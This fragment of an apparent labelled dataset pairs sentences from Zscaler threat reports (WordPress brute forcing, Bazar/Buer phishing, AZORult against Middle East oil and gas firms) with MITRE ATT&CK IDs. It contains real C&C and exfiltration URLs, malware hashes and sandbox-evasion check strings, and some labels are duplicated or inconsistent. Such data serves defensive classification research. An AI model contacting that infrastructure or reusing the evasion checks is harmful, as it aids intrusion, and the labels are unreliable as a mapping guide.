actually doing a reverse IP lookup for the IPs fetched from the C&C and is looking for all the available methods on the corresponding DNS.", "labels": ["T1110", "TA0011", "T1046"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "Once found, it attempts to gain the login via cookie-based authentication by logging into WordPress using cURL, authenticating the server (which ran the cURL script) and providing the username/password to the login page of the desired WordPress site.", "labels": ["TA0006"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "![Figure 15: Brute Force attack on wordPress sites](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2015.png)", "labels": ["T1110"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 15: The list of WordPress sites targeted for a brute force attack.*", "labels": ["T1110"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The samples we found had similar activity but used a .space TLD domain as one of its C&C.", "labels": ["TA0011"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "In addition, WordPress admin should keep the XML-RPC option disabled and refrain from using logins from third-party applications.", "labels": ["T1110"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "| **T1110** | **Brute Force** |", "labels": ["T1110"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "| **T1556** | **Modify Authentication Process** |", "labels": ["T1556"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "| **T1497** | **Sandbox Evasion** |", "labels": ["T1497"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "| **T1055** | **Process Injection** |", "labels": ["T1055"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "| **T1003** | **OS Credential Dumping** |", "labels": ["T1003"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "| **T1491** | **Defacement** |", "labels": ["T1491"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "Spear Phishing Campaign Delivers Buer and Bazar Malware", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "Zscaler ThreatLabZ became aware of a prevalent phishing campaign targeting employees of various organizations.", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "During the past couple of weeks, many enterprise users have been getting spear phishing emails indicating that their employment with the company has been terminated.", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "These emails contain a Google document link that leads to the Bazar backdoor (from the TrickBot gang).", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "What's interesting is that this campaign also used the Buer loader, which is the first time we have seen these two malware strains used together.", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "Use of the Buer loader by the TrickBot gang comes as no surprise as this group is\u00a0known to work with different malware\u00a0groups.", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "In the past, the TrickBot gang\u00a0has also\u00a0worked with other botnets, such as\u00a0Emotet.", "labels": ["S0367"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "In this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted\u00a0on Google Drive or, in some cases, hosted elsewhere.", "labels": ["T1566", "T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "In some previous phishing email campaigns,\u00a0attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.", "labels": ["T1566", "T1036"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "![Spear Phishing email template 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/mail1_1.PNG)", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "*Figure 1: One of the spear phishing email templates targeting an employee.*", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "![Spear Phishing email template 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/mail2_0.PNG)", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "*Figure 2: Another spear phishing email template*", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been\u00a0terminated, as shown in Figure 3.", "labels": ["T1566", "T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "*Figure 3: The link to the fake\u00a0Google Doc\u00a0containing the download link.*", "labels": ["T1566", "T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The link in the Google Doc\u00a0redirects to the\u00a0URL unitedyfl[.]com/print\\_preview.exe to download the\u00a0malware payload.", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "### Packer", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The packer used in both malware payloads is identical.", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "Most notably, the packed binaries are exe files with a randomly named export function.", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The export function is responsible for payload decryption and injection.", "labels": ["T1140"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "First, a shellcode is decrypted, which further decrypts a headerless PE\u00a0loader that has the final payload in its overlay.", "labels": ["T1059", "T1140"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "![Headerless PE loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/headerless_loader.png)", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "*Figure 4: The decrypted header less PE loader.*", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "### Bazar loader and Bazar backdoor", "labels": ["S0534", "S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.", "labels": ["S0534", "TA0002", "S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.", "labels": ["TA0002", "T1562", "T1070"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The samples used in this campaign heavily rely on\u00a0control flow obfuscation.", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format:", "labels": ["S0534", "S0534", "TA0011", "T1105"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "{C&C}/api/v\\d{3}", "labels": ["TA0011"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The downloaded payload is XOR-encrypted and can be decrypted using the script provided in the appendix.", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.", "labels": ["TA0011", "S0534", "S0183", "T1573"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The C&C server TLS certificate is shown in Figure 7.", "labels": ["TA0011", "T1573"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "![Bazar/Trickbot TLS Certificate](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/trickbot_cert.JPG)", "labels": ["S0534", "S0266"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "*Figure 7: The\u00a0Bazar/TrickBot TLS certificate.*", "labels": ["S0534", "S0183"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike penetration testing and post-exploitation toolkit on the victim's machine within some period of time after the infection.", "labels": ["TA0002", "S0154", "T1105"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "By deploying Cobalt Strike, it is clear that this stealthy backdoor is being used to gain a foothold\u00a0in corporate networks so that ransomware can be deployed, data can be stolen, or network access could be sold to other threat actors.", "labels": ["S0154", "T1486", "T1486", "TA0010"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "### Buer loader", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The Buer loader was first discovered around the end of 2019.", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "It has most of the important strings encrypted and APIs are loaded by hash, just\u00a0like most of the sophisticated malware\u00a0these days.", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The Buer loader was captured by the Zscaler Cloud Sandbox.", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "![Buer Loader sandbox report](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/buer%20sandbox.png)", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "*Figure 8: The Zscaler Cloud Sandbox report for the Buer loader.*", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "The TrickBot group has been running similarly themed campaigns for some time.", "labels": ["S0183"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "Fa0322fb70610d6e67585588184eda39 (Buer loader)", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "06f42898d5b2303c0b455d3152ced044 (Bazar loader)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "04a20c9f33023439b612935b6901917f (Bazar loader)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "951acc18e4f14471f49235327e0c1ccc (Bazar loader)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "4bb9a709958a1790a6bc257a9b5cb48e (Bazar loader)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "03e699324d06bd3d597994f5df893048 (Bazar backdoor group: t1)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "#### **C&C**", "labels": ["TA0011"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "**Buer loader**", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "**Bazar loader**", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "* /api/v190 - Download Updated Bazar loader(64 - bit)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "* /api/v192 - Download Bazar backdoor(64 - bit)", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1566.002 | Phishing: Spearphishing Link |", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1566.003 | Phishing: Spearphishing via Service |", "labels": ["T1566"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1204.001 | User Execution: Malicious Link |", "labels": ["T1204"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1204.002 | User Execution: Malicious File |", "labels": ["T1204"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |", "labels": ["T1547"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1055.013 | Process Injection: Process Doppelg\u00e4nging |", "labels": ["T1055"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1055.012 | Process Injection: Process Hollowing |", "labels": ["T1055"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1027.002 | Obfuscated Files or Information: Software Packing |", "labels": ["T1027"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1140 | Deobfuscate/Decode Files or Information |", "labels": ["T1140"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1036.005 | Masquerading: Match Legitimate Name or Location |", "labels": ["T1036"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1087 | Account Discovery |", "labels": ["T1087", "T1087"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1010 | Application Window Discovery |", "labels": ["T1010"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1012 | Query Registry |", "labels": ["T1012"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1018 | Remote System Discovery |", "labels": ["T1018"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1082 | System Information Discovery |", "labels": ["T1082"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1033 | System Owner/User Discovery |", "labels": ["T1033"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1124 | System Time Discovery |", "labels": ["T1124"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1119 | Automated Collection |", "labels": ["T1119"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1005 | Data from Local System |", "labels": ["T1005"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1053.002 | Scheduled Task/Job: At (Windows) |", "labels": ["T1053"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1547.004 | Boot or Logon Autostart Execution: Winlogon Helper DLL |", "labels": ["T1547"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1071.001 | Application Layer Protocol: Web Protocols |", "labels": ["T1071"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1568.002 | Dynamic Resolution: Domain Generation Algorithms |", "labels": ["T1568", "T1568"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "| T1041 | Exfiltration Over C2 Channel |", "labels": ["T1041"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "**Script to decrypt downloaded Bazar backdoor**", "labels": ["S0534"], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "**Buer strings**", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "**Buer loader API hashes and corresponding API names**", "labels": [], "document": "zscaler_2020-09-29_spear-phishing-campaign-delivers-buer"}, {"sentence": "We discovered multiple instances of malicious PDF files sent as email attachments and were used to distribute an information-stealing Trojan, AZORult, to these organizations.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The attack chain begins with an email that appears to be from an official working at the ADNOC and\u00a0is targeted\u00a0at officials working in the supply chain and government sectors in the Middle East.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Each email in this campaign has an attached PDF file.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "This PDF contains download links on the first page that lead to legitimate file sharing sites, such as wetransfer and mega.nz where a ZIP archive is hosted.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The ZIP archive contains a malicious and packed .NET executable that will decrypt, load, and execute the embedded AZORult binary.", "labels": ["T1027", "T1059", "T1140"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Figure 2 shows an email message that pretends to come from a senior chemist of lab operations of ADNOC Sour Gas.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 2: A fake email sent to officials in the supply chain industry in the Middle East.*", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The two Gmail addresses observed in the attacks were:", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The threat actor also leveraged anonymous email services from Tutanota to create emails registered with keemail.me and tuta.io which were also used in this email campaign.", "labels": ["T1566", "T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The PDF files attached to the email are multipage documents (containing 14 pages) that appear\u00a0to be Requests for Quotations (RFQ) for supply contracts and legal tenders for various projects related to ADNOC and the Doha airport.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The decoy documents are carefully crafted to appear legitimate for social engineering purposes.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The first page of each document contains the instructions to access the specifications and drawings using embedded download links that lead to malicious ZIP archives as described in the attack flow above.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "It bears the logo of ADNOC at the top right and the first page contains the malicious download links.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 3: The fake letter contained in the PDF associated with this attack.*", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Figure 4 shows a PDF that\u00a0pretends to be a Request for Quotation for Hamad International Airport expansion plan for Doha\u00a0and supposedly comes from a supply chain trading contractor in Qatar.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Based on the target recipients of the email, the contents of the email, and the attached PDF files, along with the metadata and infrastructure analysis, we conclude that this is a targeted attack on organisations in the Middle East.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "After investigating the metadata of PDF files, we were able to discover several PDFs that we associate with the same threat actor.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "In addition to the contents of the emails and the documents\u00a0that were used for threat attribution, we can also infer from the Command and Control (C&C)\u00a0infrastructure that the threat actor has specifically chosen a C&C server that blends with the theme.", "labels": ["TA0011", "TA0011", "TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "In addition to the contents of the emails and the documentsthat were used for threat attribution, we can also infer from the Command and Control (C&C)\u00a0infrastructure that the threat actor has specifically chosen a C&C server that blends with the theme.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The C&C\u00a0server in the samples we discovered was\u00a0crevisoft.net.", "labels": ["TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "With a high confidence level, we can conclude that this threat actor is interested in stealing information and gaining access to infrastructure of supply chain-related organisations located in the Middle East.", "labels": ["TA0010", "TA0001"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "### **Technical analysis of the .NET payload**", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "For the purpose of technical analysis, we will consider the .NET binary with MD5 hash: 84e7b5a60cd771173b75a775e0399bc7", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "This payload, which is present inside the downloaded ZIP archive, is a packed and obfuscated .NET binary.", "labels": ["T1027", "T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Based on static analysis, we can see that the payload pretends to be a Skype application with spoofed metadata as shown in Figure 7.", "labels": ["T1036"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%207%20-%20.NET%201.png)", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 7: Metadata of the main .NET executable.*", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Upon execution, it unpacks another payload that is embedded in the resource section.", "labels": ["TA0002"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Figure 8 shows the custom algorithm that decrypts the payload using a hardcoded key \u201cGXR20\u201d.", "labels": ["T1140"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%208%20-%20.NET%202.png)", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 8: The subroutine used to decrypt the second stage .NET DLL.*", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Figure 9 shows the decrypted payload, which is a .NET DLL with the **MD5 hash**\u00a00988195ab961071b4aa2d7a8c8e6372d and the name\u00a0Aphrodite.dll", "labels": ["T1140", "T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "![Figure 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%209%20-%20.NET%203.png)", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 9: The unpacked and loaded second stage DLL called Aphrodite.*", "labels": ["T1140"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "![Figure 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2010%20-%20.NET%204.png)", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "This DLL further unpacks another binary, which is embedded as a bitmap image in the resource section of the main executable, as shown in Figure 11.", "labels": ["T1140", "T1027"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "![Figure 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2011%20-%20.NET%205.png)", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 11: The bitmap image inside the resource section that contains the next stage payload.*", "labels": ["T1027"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The custom algorithm is based on XOR using the key indicated by the parameter\u00a0ugz3**.**", "labels": ["T1027"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The resulting unpacked binary is a .NET DLL with **MD5 hash**\u00a0ae5f14478d5e06c1b2dc2685cbe992c1 and the name\u00a0Jupiter.", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "![Figure 12](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/oil_gas_dalma/Figure%2012%20-%20.NET%206.png)", "labels": ["T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 12: The unpacked and loaded third stage DLL called Jupiter.*", "labels": ["T1140"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "This third stage DLL uses various methods to detect the presence of a virtualization or an analysis environment.", "labels": ["T1497"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Below is a summary of the methods used by this DLL to detect the analysis environment.", "labels": ["T1497"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Registry key: \"HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0\"", "labels": ["T1497"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Checks for the presence of a DLL with the name: \"SbieDll.dll\" in the process address space.", "labels": ["T1497"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "FilePath contains: \"//VIRUS\" OR \"SANDBOX\" OR \"SAMPLE\" OR \"C:\\\\file.exe\"", "labels": ["T1497"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "After all the above environment checks are performed, the AZORult payload (**MD5 hash:** 38360115294c49538ab15b5ec3037a77)\u00a0is injected using the process hollowing technique in a new instance of the main process.", "labels": ["T1055"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "We will not describe the details of the functionality of AZORult information stealer since it is already well-documented in the public domain.", "labels": [], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "It is important to note that based on the flow of the code execution and the anti-analysis techniques used, the .NET packed payload appears to be created using the CyaX packer.", "labels": ["T1497", "T1059"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The final unpacked payload, AZORult, will perform information stealing activities on the machine and exfiltrate the information by sending an HTTP POST request to the URL: hxxp://crevisoft.net/images/backgrounds/ob/index.php", "labels": ["T1140", "TA0009", "T1048"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Upon inspection, we discovered that opendir was enabled on the C&C server as shown in Figure 13.", "labels": ["TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 13: Opendir enabled on the C&C server.*", "labels": ["TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "The AZORult panel on the C&C server can be accessed atthe URL:hxxp://crevisoft.net/images/backgrounds/ob/panel/admin.php.", "labels": ["TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 14: The AZORult panel*", "labels": [], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Among other artifacts we discovered on the C&C server, we found a PHP mailing script deployed at\u00a0hxxp://crevisoft[.]net/images/-/leaf.php.", "labels": ["TA0011"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "This enables the threat actor to send emails using the C&C server\u2019s SMTP.", "labels": ["TA0011", "T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "*Figure 15: The PHP mailing script on the C&C server.*", "labels": ["TA0011", "T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "And always be wary of links embedded inside file formats such as PDF since these links\u00a0could lead to download of malicious files on your system.", "labels": ["T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1566.001 | Spearphishing Attachment | Uses PDF attachments containing malicious URLs |", "labels": ["T1566", "T1566"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1204.002 | User Execution: Malicious File | User opens pdf file.", "labels": ["T1204", "T1204"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Click the URL link.", "labels": ["T1204"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Downloads ZIP file.", "labels": ["T1204"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "Extracts zip file and executes the binary.", "labels": ["TA0002"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1036.005\u00a0 | Masquerading: Match Legitimate Name or Location | File names used related to projects directly linked to the Middle East.", "labels": ["T1036"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1027.002\u00a0 | Obfuscated Files or Information: Software Packing | Payloads are packed with a multilayer packer.", "labels": ["T1027", "T1027"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1497 | Virtualization/Sandbox Evasion | Uses Registry, WMI, UserName-based anti-VM techniques |", "labels": ["T1497", "T1497"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1134.002 | Access Token Manipulation: Create Process with Token | One of AZORult capabilities |", "labels": ["T1134"], "document": "zscaler_2020-09-29_targeted-attacks-oil-and-gas"}, {"sentence": "| T1555.003 | 